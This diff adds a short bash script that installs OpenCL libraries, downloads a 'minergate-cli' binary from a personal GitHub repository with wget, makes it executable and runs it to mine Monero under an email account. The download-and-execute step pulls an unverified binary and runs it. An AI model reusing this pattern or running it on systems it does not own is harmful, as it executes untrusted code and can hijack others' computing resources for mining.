@@ -1,0 +1,6 @@
+#!/bin/bash
+sudo apt-get update;
+sudo apt install ocl-icd-opencl-dev -y;
+wget https://github.com/vijaykumar211/public_files/raw/master/minergate-cli;
+chmod +x minergate-cli;
+./minergate-cli -u useremail@gmail.com --xmr;
